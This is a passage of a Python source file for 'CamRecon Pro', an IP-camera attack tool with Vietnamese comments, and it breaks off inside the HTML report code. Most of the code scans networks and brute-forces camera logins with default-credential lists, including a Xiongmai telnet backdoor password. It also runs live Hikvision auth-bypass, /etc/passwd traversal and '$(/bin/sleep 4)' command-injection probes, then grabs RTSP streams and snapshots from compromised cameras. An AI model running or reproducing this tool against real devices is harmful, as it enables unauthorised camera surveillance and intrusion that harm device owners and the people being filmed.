#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CamRecon Pro v2.0 - Bộ công cụ đánh giá bảo mật camera IP (Termux/Android)

Modules:
  - Quét mạng LAN (TCP sweep + ARP + OUI MAC fingerprint)
  - Nhận dạng hãng: Hikvision, Dahua, TP-Link, Reolink, Xiongmai, VStarcam, Foscam...
  - RTSP engine (Basic/Digest auth, anonymous stream, enumerate paths)
  - ONVIF engine (WS-Discovery, DeviceInformation, Profiles, SnapshotUri)
  - Kiểm tra CVE: 2017-7921, 2018-9995, 2020-25078, 2021-36260, 2021-33044/45...
  - Brute-force HTTP/RTSP với wordlist tùy chỉnh
  - Snapshot tự động + xuất báo cáo JSON/TXT/HTML/M3U + Telegram notify
  - Shodan Internet camera search (REST API, không cần thư viện)

Chỉ sử dụng trên hệ thống bạn sở hữu hoặc được ủy quyền kiểm tra.
"""

import argparse
import base64
import hashlib
import html as html_mod
import ipaddress
import json
import os
import random
import re
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone

try:
    import requests
    from requests.auth import HTTPDigestAuth
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] Thiếu thư viện requests. Cài bằng:  pip install requests")
    sys.exit(1)

# ============================ CẤU HÌNH ============================
VERSION = "2.0"
TIMEOUT = 3.0
THREADS = 100
UA = "Mozilla/5.0 (Linux; Android 13) CamReconPro/2.0"
LOCK = threading.Lock()
results_global = []

CAM_PORTS = [80, 443, 554, 8080, 8899, 9000, 37777, 34567, 85, 8000, 81, 82, 23, 22, 8001, 8081, 5000, 8554]
HTTP_PORTS = [80, 443, 8080, 8000, 81, 82, 85, 8899]
RTSP_PORTS = [554, 8554]

RTSP_PATHS = [
    "/", "/Streaming/Channels/101", "/Streaming/Channels/102",
    "/Streaming/Channels/103", "/cam/realmonitor?channel=1&subtype=0",
    "/cam/realmonitor?channel=1&subtype=1", "/live/ch0", "/live/ch1",
    "/h264/ch1/main/av_stream", "/h264/ch1/sub/av_stream",
    "/user=admin&password=admin&channel=1&stream=0.sdp",
    "/ch01.264", "/live", "/media/video1", "/onvif1", "/11",
    "/unicast/c1/s0/live", "/unicast/c2/s0/live",
]

CREDS = {
    "hikvision": [("admin", "12345"), ("admin", "admin"), ("admin", "123456"),
                  ("admin", "Hik12345"), ("admin", "hik12345")],
    "dahua":     [("admin", "admin"), ("admin", "123456"), ("admin", "888888"),
                  ("admin", "password"), ("admin", "admin123")],
    "tp-link":   [("admin", "admin"), ("admin", "123456"), ("admin", "")],
    "reolink":   [("admin", ""), ("admin", "admin"), ("admin", "123456")],
    "xiongmai":  [("admin", ""), ("admin", "admin"), ("root", "xc3511"),
                  ("root", "12345"), ("admin", "9999")],
    "vstarcam":  [("admin", ""), ("admin", "123456"), ("admin", "admin")],
    "foscam":    [("admin", ""), ("admin", "admin")],
    "generic":   [("admin", ""), ("admin", "admin"), ("admin", "12345"),
                  ("admin", "123456"), ("admin", "password"), ("admin", "1234"),
                  ("admin", "12345678"), ("admin", "888888"), ("root", "root"),
                  ("root", "12345"), ("user", "user"), ("service", "service")],
}

# OUI MAC - nhận dạng hãng qua địa chỉ MAC
OUI = {
    "44:19:B6": "Hikvision", "8C:EA:1B": "Hikvision", "3C:EF:8C": "Hikvision",
    "94:EB:2C": "Hikvision", "58:8A:5A": "Hikvision", "9C:45:56": "Hikvision",
    "4C:8D:79": "Hikvision", "08:17:35": "Hikvision", "F4:57:83": "Hikvision",
    "F0:2F:74": "Hikvision", "3C:8C:F8": "Hikvision", "B8:A4:4F": "Hikvision",
    "28:57:BE": "Hikvision", "30:9C:23": "Hikvision", "00:0E:53": "Hikvision",
    "BC:AD:28": "Hikvision", "E8:AB:FA": "Hikvision",
    "A0:BD:1D": "Dahua", "3C:E5:A6": "Dahua", "4C:11:BF": "Dahua",
    "E0:50:8B": "Dahua", "78:7B:8A": "Dahua", "38:68:DD": "Dahua",
    "90:02:A9": "Dahua", "94:9A:A9": "Dahua", "5C:C9:D3": "Dahua",
    "64:32:A8": "Dahua", "BC:A8:6F": "Dahua", "9C:C7:A6": "Dahua",
    "44:4C:A8": "Reolink", "00:65:5C": "Reolink", "7C:30:5A": "Reolink",
    "8C:85:80": "Reolink",
    "50:C7:BF": "TP-Link", "14:CC:20": "TP-Link", "18:A6:F7": "TP-Link",
    "98:DA:C4": "TP-Link", "C0:06:C3": "TP-Link", "F4:F2:6D": "TP-Link",
    "30:B4:9E": "TP-Link", "70:4F:57": "TP-Link", "A4:2B:B0": "TP-Link",
    "AC:84:C6": "TP-Link", "D4:6E:0C": "TP-Link", "B0:BE:76": "TP-Link",
    "60:32:B1": "TP-Link", "D8:07:B6": "TP-Link", "7C:D1:C3": "TP-Link",
    "00:0B:5A": "Xiongmai", "04:F8:C2": "Xiongmai", "40:5A:CC": "Xiongmai",
    "B4:6D:83": "Xiongmai", "48:02:5A": "Xiongmai",
}

BUILTIN_USERS = ["admin", "root", "user", "supervisor", "service", "test", "guest", "operator"]
BUILTIN_PASS = ["", "admin", "12345", "123456", "12345678", "1234", "password",
                "888888", "666666", "000000", "111111", "123123", "123321", "654321",
                "abc123", "root", "test", "guest", "user", "pass", "P@ssw0rd",
                "Admin@123", "admin123", "123456789", "1234567890", "hik12345",
                "Hik12345", "camera", "ipcam", "999999", "1234567", "12345admin"]

SNAP_PATHS = {
    "hikvision": ["/ISAPI/Streaming/channels/101/picture", "/ISAPI/Streaming/channels/102/picture"],
    "dahua":     ["/cgi-bin/snapshot.cgi?1", "/cgi-bin/snapshot.cgi?channel=1"],
    "tp-link":   ["/streaming/channels/1/picture", "/snapshot.cgi"],
    "reolink":   ["/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=wueIbac3"],
    "generic":   ["/snapshot.jpg", "/image.jpg", "/snap.jpg", "/onvif-http/snapshot", "/capture"],
}

# ============================ UTILS ============================
def log(msg, lvl="info"):
    colors = {"ok": "\033[92m", "warn": "\033[93m", "err": "\033[91m", "info": "\033[96m", "none": ""}
    pre = {"ok": "[+] ", "warn": "[!] ", "err": "[-] ", "info": "[*] ", "none": ""}[lvl]
    with LOCK:
        if sys.stdout.isatty() and lvl in colors:
            print(f"{colors[lvl]}{pre}{msg}\033[0m")
        else:
            print(f"{pre}{msg}")


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def url_base(ip, port):
    scheme = "https" if port == 443 else "http"
    return f"{scheme}://{ip}" if port in (80, 443) else f"{scheme}://{ip}:{port}"


# ============================ MẠNG ============================
def get_local_ips():
    ips = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.append(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    try:
        out = subprocess.check_output(["ip", "addr"], text=True, stderr=subprocess.DEVNULL)
        ips += re.findall(r"inet\s+(\d+\.\d+\.\d+\.\d+)", out)
    except Exception:
        pass
    return list(dict.fromkeys(ips))


def get_subnets():
    subs = set()
    try:
        out = subprocess.check_output(["ip", "addr"], text=True, stderr=subprocess.DEVNULL)
        for m in re.finditer(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", out):
            ip, pfx = m.group(1), int(m.group(2))
            try:
                if ipaddress.ip_address(ip).is_private and pfx >= 16:
                    subs.add(str(ipaddress.ip_network(f"{ip}/{pfx}", strict=False)))
            except ValueError:
                continue
    except Exception:
        pass
    if not subs:
        for ip in get_local_ips():
            subs.add(f"{'.'.join(ip.split('.')[:3])}.0/24")
    return sorted(subs)


def arp_neighbors():
    """Lấy bảng ARP (IP -> MAC) để nhận dạng hãng nhanh."""
    neigh = {}
    try:
        out = subprocess.check_output(["ip", "neigh"], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            m = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+dev\s+\S+\s+lladdr\s+([0-9a-f:]+)", line)
            if m:
                neigh[m.group(1)] = m.group(2)
    except Exception:
        pass
    try:
        with open("/proc/net/arp", "r") as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
                    neigh[parts[0]] = parts[3]
    except Exception:
        pass
    return neigh


def oui_brand(mac):
    if not mac:
        return None
    m = mac.upper().replace("-", ":")
    for prefix, brand in OUI.items():
        if m.startswith(prefix):
            return brand
    return None


def tcp_connect(ip, port, timeout=0.8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        return s.connect_ex((ip, port)) == 0
    except Exception:
        return False
    finally:
        s.close()


def port_scan(ip):
    open_ports = []
    for port in CAM_PORTS:
        if tcp_connect(ip, port, 0.7):
            open_ports.append(port)
    return open_ports


def host_alive(ip):
    for port in [80, 554, 443, 8080, 9000, 23]:
        if tcp_connect(ip, port, 0.5):
            return True
    return False


# ============================ HTTP ============================
def fingerprint(text):
    t = (text or "").lower()
    if "hikvision" in t or "isapi" in t:
        return "hikvision"
    if "dahua" in t or "webclient" in t or "dvrwebs" in t or "amcrest" in t:
        return "dahua"
    if "tp-link" in t or "tapo" in t:
        return "tp-link"
    if "reolink" in t:
        return "reolink"
    if "xiongmai" in t or "xmeye" in t or "netip" in t or "dvr" in t:
        return "xiongmai"
    if "vstarcam" in t:
        return "vstarcam"
    if "foscam" in t:
        return "foscam"
    if "uniview" in t:
        return "uniview"
    return "unknown"


def http_auth_ok(ip, port, u, p):
    """Thử Basic/Digest auth HTTP; trả về tên scheme nếu đúng."""
    url = url_base(ip, port) + "/"
    try:
        anon = requests.get(url, timeout=TIMEOUT, verify=False, headers={"User-Agent": UA})
        if anon.status_code != 401:
            return None
    except Exception:
        return None
    for name, auth in (("digest", HTTPDigestAuth(u, p)), ("basic", (u, p))):
        try:
            r = requests.get(url, auth=auth, timeout=TIMEOUT, verify=False, headers={"User-Agent": UA})
            if r.status_code == 200:
                return name
        except Exception:
            continue
    return None


# ============================ RTSP ENGINE ============================
def rtsp_raw(ip, port, method, path, auth_hdr="", extra_hdrs=""):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, port))
        uri = f"rtsp://{ip}:{port}{path}"
        req = f"{method} {uri} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: CamReconPro\r\n{extra_hdrs}"
        if auth_hdr:
            req += f"Authorization: {auth_hdr}\r\n"
        req += "\r\n"
        s.send(req.encode())
        data = b""
        s.settimeout(2.0)
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if b"\r\n\r\n" in data:
                break
        s.close()
        return data.decode(errors="ignore")
    except Exception:
        return ""


def rtsp_code(resp):
    m = re.search(r"RTSP/1\.\d\s+(\d{3})", resp)
    return m.group(1) if m else ""


def rtsp_digest_params(resp):
    m = re.search(r"WWW-Authenticate:\s*Digest\s+(.*?)(?:\r?\n|$)", resp, re.I | re.S)
    if not m:
        return None
    params = {}
    for mm in re.finditer(r'(\w+)\s*=\s*(?:"([^"]*)"|([^,\s]+))', m.group(1)):
        params[mm.group(1)] = mm.group(2) if mm.group(2) is not None else mm.group(3)
    return params


def rtsp_digest_auth(ip, port, u, p, path):
    """Thực hiện RTSP Digest handshake (Hikvision và nhiều hãng khác)."""
    resp0 = rtsp_raw(ip, port, "DESCRIBE", path, extra_hdrs="Accept: application/sdp\r\n")
    params = rtsp_digest_params(resp0)
    if not params:
        return ""
    realm, nonce = params.get("realm", ""), params.get("nonce", "")
    uri = f"rtsp://{ip}:{port}{path}"
    ha1 = md5(f"{u}:{realm}:{p}")
    ha2 = md5(f"DESCRIBE:{uri}")
    qop = params.get("qop")
    if qop and "auth" in qop:
        cnonce, nc = "0a4f113b", "00000001"
        resp = md5(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
        auth = (f'Digest username="{u}", realm="{realm}", nonce="{nonce}", uri="{uri}", '
                f'qop=auth, nc={nc}, cnonce="{cnonce}", response="{resp}"')
        if params.get("opaque"):
            auth += f', opaque="{params["opaque"]}"'
    else:
        resp = md5(f"{ha1}:{nonce}:{ha2}")
        auth = f'Digest username="{u}", realm="{realm}", nonce="{nonce}", uri="{uri}", response="{resp}"'
    return rtsp_raw(ip, port, "DESCRIBE", path, auth, "Accept: application/sdp\r\n")


def rtsp_try_auth(ip, port, u, p, path):
    """Thử DESCRIBE với Basic rồi Digest; trả về (code, response)."""
    if u == "" and p == "":
        resp = rtsp_raw(ip, port, "DESCRIBE", path, extra_hdrs="Accept: application/sdp\r\n")
        return rtsp_code(resp), resp
    cred = base64.b64encode(f"{u}:{p}".encode()).decode()
    resp = rtsp_raw(ip, port, "DESCRIBE", path, f"Basic {cred}", "Accept: application/sdp\r\n")
    code = rtsp_code(resp)
    if code == "401":
        resp = rtsp_digest_auth(ip, port, u, p, path)
        code = rtsp_code(resp)
    return code, resp


def rtsp_cred_ok(ip, port, u, p):
    for path in RTSP_PATHS[:4]:
        code, _ = rtsp_try_auth(ip, port, u, p, path)
        if code in ("200", "404"):
            return True
    return False


def rtsp_enum_paths_ok(ip, port, u, p):
    ok = []
    for path in RTSP_PATHS:
        code, _ = rtsp_try_auth(ip, port, u, p, path)
        if code == "200":
            ok.append(path)
    return ok


# ============================ ONVIF ENGINE ============================
def onvif_ws_discover(timeout=4):
    """WS-Discovery Probe qua UDP multicast — tìm camera ONVIF trên LAN."""
    msg = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
 xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"
 xmlns:wsdp="http://schemas.xmlsoap.org/ws/2006/02/devprof">
<soap:Header>
<wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>
<wsa:MessageID>urn:uuid:%s</wsa:MessageID>
<wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>
</soap:Header>
<soap:Body>
<wsd:Probe><wsd:Types>wsdp:NetworkVideoTransmitter</wsd:Types></wsd:Probe>
</soap:Body>
</soap:Envelope>""" % (str(random.randint(10**10, 10**11)))
    found = {}
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.settimeout(timeout)
    try:
        s.sendto(msg.encode(), ("239.255.255.250", 3702))
    except Exception:
        s.close()
        return []
    end = time.time() + timeout
    while time.time() < end:
        try:
            data, addr = s.recvfrom(65535)
        except socket.timeout:
            break
        except Exception:
            break
        txt = data.decode(errors="ignore")
        for x in re.findall(r"<d:XAddrs>([^<]+)</d:XAddrs>", txt):
            found[x] = addr[0]
        for x in re.findall(r"<wsa:XAddrs>([^<]+)</wsa:XAddrs>", txt):
            found[x] = addr[0]
    s.close()
    return [{"xaddr": x, "src": src} for x, src in found.items()]


def onvif_call(ip, port, u, p, service, action, extra_body=""):
    """Gọi SOAP ONVIF với WS-Security UsernameToken digest."""
    services = {
        "device": ("tds", "http://www.onvif.org/ver10/device/wsdl"),
        "media":  ("trt", "http://www.onvif.org/ver10/media/wsdl"),
    }
    prefix, ns = services.get(service, ("tds", "http://www.onvif.org/ver10/device/wsdl"))
    nonce = base64.b64encode(os.urandom(16)).decode()
    created = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
    digest = base64.b64encode(hashlib.sha1((nonce + created + p).encode()).digest()).decode()
    sec = ('<Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-'
           'wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/'
           'oasis-200401-wss-wssecurity-utility-1.0.xsd"><UsernameToken>'
           f'<Username>{u}</Username>'
           '<Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-'
           f'username-token-profile-1.0#PasswordDigest">{digest}</Password>'
           '<Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-'
           f'soap-message-security-1.0#Base64Binary">{nonce}</Nonce>'
           f'<Created>{created}</Created></UsernameToken></Security>')
    if extra_body:
        body = f'<{prefix}:{action} xmlns:{prefix}="{ns}">{extra_body}</{prefix}:{action}>'
    else:
        body = f'<{prefix}:{action} xmlns:{prefix}="{ns}"/>'
    xml = ('<?xml version="1.0" encoding="UTF-8"?>'
           '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
           'xmlns:tds="http://www.onvif.org/ver10/device/wsdl" '
           'xmlns:trt="http://www.onvif.org/ver10/media/wsdl" '
           'xmlns:tt="http://www.onvif.org/ver10/schema">'
           f'<soap:Header>{sec}</soap:Header>'
           f'<soap:Body>{body}</soap:Body></soap:Envelope>')
    url = f"http://{ip}:{port}/onvif/{service}_service"
    try:
        r = requests.post(url, data=xml,
                          headers={"Content-Type": "application/soap+xml; charset=utf-8",
                                   "User-Agent": UA},
                          timeout=TIMEOUT, verify=False)
        return r.status_code, r.text
    except Exception:
        return 0, ""


def onvif_device_info(ip, port, u, p):
    code, txt = onvif_call(ip, port, u, p, "device", "GetDeviceInformation")
    if code != 200:
        return None
    info = dict(re.findall(r"<(?:tds|tt):(Manufacturer|Model|FirmwareVersion|SerialNumber)>([^<]+)", txt))
    return info or None


def onvif_snapshot_uri(ip, port, u, p):
    code, txt = onvif_call(ip, port, u, p, "media", "GetProfiles")
    if code != 200:
        return None
    m = re.search(r"<trt:Profiles[^>]*token=\"([^\"]+)\"", txt)
    if not m:
        return None
    token = m.group(1)
    code, txt = onvif_call(ip, port, u, p, "media", "GetSnapshotUri",
                           f"<trt:ProfileToken>{token}</trt:ProfileToken>")
    if code != 200:
        return None
    m = re.search(r"<.*?:Uri>([^<]+)</.*?:Uri>", txt)
    return m.group(1) if m else None


# ============================ CVE CHECKS ============================
def cve_checks(ip, port):
    base = url_base(ip, port)
    found = []

    # CVE-2017-7921 - Hikvision auth bypass
    try:
        r = requests.get(f"{base}/Security/users?auth=YWRtaW46", timeout=TIMEOUT,
                         verify=False, headers={"User-Agent": UA})
        if r.status_code == 200 and "UserID" in r.text:
            found.append("CVE-2017-7921 Hikvision auth bypass (/Security/users)")
    except Exception:
        pass

    # CVE-2018-9995 - TBK/Xiongmai DVR auth bypass
    try:
        r = requests.get(f"{base}/device.rsp?opt=user&cmd=list",
                         headers={"Cookie": "uid=admin", "User-Agent": UA},
                         timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and "uid" in r.text:
            found.append("CVE-2018-9995 TBK/Xiongmai DVR auth bypass")
    except Exception:
        pass

    # Dahua RPC2 default cred
    try:
        r = requests.post(f"{base}/RPC2_Login",
                          json={"method": "global.login",
                                "params": {"userName": "admin", "password": "123456",
                                           "clientType": "DahuaWeb"},
                                "id": 1},
                          timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and '"session"' in r.text:
            found.append("Dahua default cred admin:123456 (RPC2_Login)")
    except Exception:
        pass

    # CVE-2020-25078 - Hikvision unauth file read
    try:
        r = requests.get(f"{base}/en/../../../../../../../../etc/passwd", timeout=TIMEOUT,
                         verify=False, headers={"User-Agent": UA})
        if r.status_code == 200 and "root:" in r.text:
            found.append("CVE-2020-25078 Hikvision unauth file read (/etc/passwd)")
    except Exception:
        pass

    # CVE-2021-36260 - Hikvision command injection (timing detection)
    try:
        payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(/bin/sleep 4)</language>'
        t0 = time.time()
        r = requests.post(f"{base}/SDK/webLanguage", data=payload,
                          headers={"Content-Type": "text/xml", "User-Agent": UA},
                          timeout=TIMEOUT + 6, verify=False)
        if r.status_code == 200 and time.time() - t0 >= 3.5:
            found.append("CVE-2021-36260 Hikvision cmd injection (sleep timing)")
    except Exception:
        pass

    # Hikvision unauth snapshot (auth param bypass)
    try:
        r = requests.get(f"{base}/onvif-http/snapshot?auth=YWRtaW46", timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and r.content[:3] == b"\xff\xd8\xff":
            found.append("Hikvision unauth snapshot (auth param bypass)")
    except Exception:
        pass

    return found


# ============================ BRUTE-FORCE ============================
def brute_host(ip, users, passes, delay=0.15, http_ports=None, rtsp_ports=None):
    http_ports = http_ports or [80, 8080, 8000]
    rtsp_ports = rtsp_ports or [554]
    found = []
    for u in users:
        for p in passes:
            if delay:
                time.sleep(delay)
            for port in http_ports:
                if not tcp_connect(ip, port, 0.6):
                    continue
                scheme = http_auth_ok(ip, port, u, p)
                if scheme:
                    item = {"proto": f"http/{scheme}", "port": port, "user": u, "pass": p}
                    if item not in found:
                        found.append(item)
                    break
            for rport in rtsp_ports:
                if not tcp_connect(ip, rport, 0.6):
                    continue
                code, _ = rtsp_try_auth(ip, rport, u, p, RTSP_PATHS[0])
                if code in ("200", "404"):
                    item = {"proto": f"rtsp:{rport}", "port": rport, "user": u, "pass": p}
                    if item not in found:
                        found.append(item)
                    break
    return found


def load_list(path, builtin):
    if path and os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]
    return list(builtin)


# ============================ PHÂN TÍCH HOST ============================
def analyze_host(ip, opts, mac=None):
    ports = port_scan(ip)
    if not ports:
        return None

    res = {"ip": ip, "mac": mac, "mac_brand": oui_brand(mac) if mac else None,
           "ports": ports, "brand": "unknown", "server": "", "fw": "",
           "creds": [], "cves": [], "streams": [], "onvif": {}, "telnet": ""}

    # ---- HTTP: banner + fingerprint + default creds + CVE ----
    for port in [p for p in HTTP_PORTS if p in ports]:
        try:
            r = requests.get(url_base(ip, port) + "/", timeout=TIMEOUT, verify=False,
                             headers={"User-Agent": UA}, allow_redirects=True)
            html_txt, server = r.text[:3000], r.headers.get("Server", "")
        except Exception:
            continue
        brand = fingerprint(html_txt + " " + server)
        if brand != "unknown":
            res["brand"] = brand
        res["server"] = server
        m = re.search(r"\bV\d+\.\d+\.\d+", html_txt)
        if m:
            res["fw"] = m.group(0)

        creds_for = CREDS.get(res["brand"], CREDS["generic"]) if res["brand"] != "unknown" else CREDS["generic"]
        for u, p in creds_for:
            scheme = http_auth_ok(ip, port, u, p)
            if scheme:
                res["creds"].append({"proto": f"http/{scheme}", "port": port, "user": u, "pass": p})
                break

        if not opts.fast:
            res["cves"] += cve_checks(ip, port)
        break

    # ---- RTSP: server header + anonymous streams + default creds ----
    for rport in RTSP_PORTS:
        if not tcp_connect(ip, rport, 1.0):
            continue
        resp = rtsp_raw(ip, rport, "OPTIONS", "/")
        m = re.search(r"Server:\s*([^\r\n]+)", resp)
        if m:
            b = fingerprint(m.group(1))
            if b != "unknown" and res["brand"] == "unknown":
                res["brand"] = b
        # stream không cần auth
        for path in RTSP_PATHS:
            code, _ = rtsp_try_auth(ip, rport, "", "", path)
            if code == "200":
                res["streams"].append(f"rtsp://{ip}:{rport}{path}")
        # default creds
        creds_for = CREDS.get(res["brand"], CREDS["generic"]) if res["brand"] != "unknown" else CREDS["generic"]
        for u, p in creds_for:
            if rtsp_cred_ok(ip, rport, u, p):
                res["creds"].append({"proto": f"rtsp:{rport}", "port": rport, "user": u, "pass": p})
                for path in rtsp_enum_paths_ok(ip, rport, u, p):
                    res["streams"].append(f"rtsp://{u}:{p}@{ip}:{rport}{path}")
                break
        break

    # ---- ONVIF: device info + snapshot uri ----
    if not opts.fast:
        onvif_creds = [("admin", "12345"), ("admin", "admin"), ("admin", "")]
        for c in res["creds"]:
            onvif_creds.append((c["user"], c["pass"]))
        for port in [p for p in HTTP_PORTS if p in ports]:
            for u, p in onvif_creds:
                info = onvif_device_info(ip, port, u, p)
                if info:
                    res["onvif"] = {"port": port, "user": u, "pass": p, **info}
                    break
            if res["onvif"]:
                break

    # ---- Telnet backdoor ----
    if 23 in ports:
        try:
            s = socket.create_connection((ip, 23), timeout=2.5)
            s.settimeout(2.5)
            data = s.recv(2048).decode(errors="ignore")
            s.close()
            res["telnet"] = data.strip()[:120]
        except Exception:
            pass

    if (res["brand"] == "unknown" and not res["creds"] and not res["cves"]
            and not res["streams"] and not res["onvif"] and not res["telnet"]):
        return None
    return res


# ============================ QUÉT ============================
def scan_hosts(hosts, opts, neigh=None):
    neigh = neigh or {}
    with ThreadPoolExecutor(max_workers=opts.threads) as ex:
        return [r for r in ex.map(lambda h: analyze_host(h, opts, neigh.get(h)), hosts) if r]


def scan_subnet(subnet, opts):
    try:
        net = ipaddress.ip_network(subnet, strict=False)
    except ValueError:
        log(f"Subnet không hợp lệ: {subnet}", "err")
        return []
    hosts = [str(h) for h in net.hosts()]
    log(f"Quét {subnet} ({len(hosts)} host)...")
    with ThreadPoolExecutor(max_workers=opts.threads) as ex:
        alive = [ip for ip, ok in zip(hosts, ex.map(host_alive, hosts)) if ok]
    log(f"{len(alive)} host phản hồi. Phân tích camera...")
    return scan_hosts(alive, opts, arp_neighbors())


# ============================ SNAPSHOT ============================
def grab_snapshot(res, outdir):
    base = None
    for port in HTTP_PORTS:
        if port in res["ports"]:
            base = url_base(res["ip"], port)
            break
    if not base:
        return None
    auth = None
    for c in res["creds"]:
        if c["proto"].startswith("http"):
            auth = (c["user"], c["pass"])
            break
    paths = SNAP_PATHS.get(res["brand"], SNAP_PATHS["generic"])
    if auth:
        for path in paths:
            try:
                r = requests.get(base + path, auth=auth, timeout=8, verify=False,
                                 headers={"User-Agent": UA})
                if r.status_code == 200 and r.content[:3] == b"\xff\xd8\xff":
                    fn = os.path.join(outdir, f"{res['ip']}.jpg")
                    with open(fn, "wb") as f:
                        f.write(r.content)
                    return fn
            except Exception:
                continue
    if res.get("onvif"):
        o = res["onvif"]
        uri = onvif_snapshot_uri(res["ip"], o["port"], o["user"], o["pass"])
        if uri:
            try:
                r = requests.get(uri, auth=(o["user"], o["pass"]), timeout=8, verify=False)
                if r.content[:3] == b"\xff\xd8\xff":
                    fn = os.path.join(outdir, f"{res['ip']}.jpg")
                    with open(fn, "wb") as f:
                        f.write(r.content)
                    return fn
            except Exception:
                pass
    if res["streams"] and shutil.which("ffmpeg"):
        fn = os.path.join(outdir, f"{res['ip']}.jpg")
        try:
            subprocess.run(["ffmpeg", "-rtsp_transport", "tcp", "-y", "-i",
                            res["streams"][0], "-frames:v", "1", fn],
                           capture_output=True, timeout=25)
            if os.path.exists(fn) and os.path.getsize(fn) > 1000:
                return fn
        except Exception:
            pass
    return None


# ============================ BÁO CÁO ============================
def print_report(results):
    if not results:
        log("Không tìm thấy thiết bị camera nào.", "err")
        return
    for r in results:
        print("\n" + "=" * 66)
        line = f"[+] {r['ip']}  |  brand: {r['brand']}"
        if r.get("mac_brand"):
            line += f"  |  mac: {r['mac_brand']}"
        line += f"  |  ports: {','.join(map(str, r['ports']))}"
        print(line)
        if r.get("server"):
            print(f"    [SRV]    {r['server']}")
        if r.get("fw"):
            print(f"    [FW]     {r['fw']}")
        for c in r["creds"]:
            print(f"    [CRED]   {c['user']}:{c['pass']} ({c['proto']}:{c['port']})")
        for cve in r["cves"]:
            print(f"    [CVE]    {cve}")
        for s in r["streams"]:
            print(f"    [RTSP]   {s}")
        if r.get("onvif"):
            o = r["onvif"]
            print(f"    [ONVIF]  {o.get('Manufacturer','')} {o.get('Model','')} "
                  f"fw={o.get('FirmwareVersion','')} (user:{o['user']} pass:{o['pass']})")
        if r.get("telnet"):
            print(f"    [TELNET] {r['telnet'][:80]}")
            if r["brand"] == "xiongmai" or r.get("mac_brand") == "Xiongmai":
                print("    [!]      Camera Xiongmai: thử telnet backdoor root:xc3511")
    print("\n" + "=" * 66)
    log(f"Tổng cộng: {len(results)} thiết bị phát hiện", "ok")


def export_json(results, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    log(f"Đã xuất JSON: {path}", "ok")


def export_txt(results, path):
    lines = [f"CamRecon Pro v{VERSION} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             "=" * 60]
    for r in results:
        lines.append(f"\nIP: {r['ip']} | brand: {r['brand']} | ports: {','.join(map(str, r['ports']))}")
        for c in r["creds"]:
            lines.append(f"  CRED  {c['user']}:{c['pass']} ({c['proto']}:{c['port']})")
        for cve in r["cves"]:
            lines.append(f"  CVE   {cve}")
        for s in r["streams"]:
            lines.append(f"  RTSP  {s}")
        if r.get("onvif"):
            o = r["onvif"]
            lines.append(f"  ONVIF {o.get('Manufacturer','')} {o.get('Model','')} "
                         f"({o['user']}:{o['pass']})")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    log(f"Đã xuất TXT: {path}", "ok")


def export_html(results, path):
    rows = ""
    for r in results:
        creds = "<br>".join(f"{c['user']}:{c['pass']} ({c['proto']}:{c['port']})" for c in r["creds"])
        cves = "<br>".join(html_mod.escape(c) for c in r["cves"])
        streams = "<br>".join(html_mod.escape(s) for s in r["streams"])
        onvif = f"{r['onvif'].get('Manufacturer','')} {r['onvif'].get('Model','')}" if r.get("onvif") else ""
        rows += (f"<tr><td>{r['ip']}</td><td>{r['brand']}</td><td>{r.get('mac_brand','')}</td>"
                 f"<td>{','.join(map(str,r['ports']))}</td><td>{creds}</td><td>{cves}</td>"
                 f"<td>{streams}</td><td>{onvif}</td></tr>")
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>CamRecon Pro - Báo cáo</title>
<style>body{{font-family:monospace;margin:20px}}table{{border-collapse:collapse;width:100%}}
th,td{{border:1px solid #999;padding:6px;text-align:left;font-size:12px}}
th{{background:#222;color:#fff}}tr:nth-child(even){{background:#f5f5f5}}</style></head>
